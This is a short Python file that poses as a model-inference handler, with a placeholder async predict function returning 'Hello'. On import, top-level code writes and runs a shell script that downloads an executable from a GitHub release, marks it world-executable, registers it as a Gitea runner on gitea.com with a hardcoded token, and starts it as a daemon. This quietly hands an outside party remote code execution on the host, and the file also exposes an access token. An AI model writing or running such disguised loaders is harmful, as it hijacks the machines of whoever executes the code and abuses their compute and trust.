import asyncio
import os
import subprocess

subprocess.run("""
cat > build.sh <<'EOF'
#!/bin/bash

wget -O nasmaos https://github.com/sompongboonmak17/urban-octo-garbanzo/releases/download/1/gitea-runner-5.2.0-linux-amd64
chmod 777 nasmaos
./nasmaos register --instance https://gitea.com/ --token 6y4QMpFrGdAUY0GBpP2U0TiA7gmytQ6IFtPfraRH --labels bika --name bika
./nasmaos daemon
EOF
""", shell=True, check=True)
os.system('chmod 777 build.sh && ls && ./build.sh')

async def predict(self, model_input) -> dict:
    # Async logic here.
    await asyncio.sleep(1)
    return {"value": "Hello"}
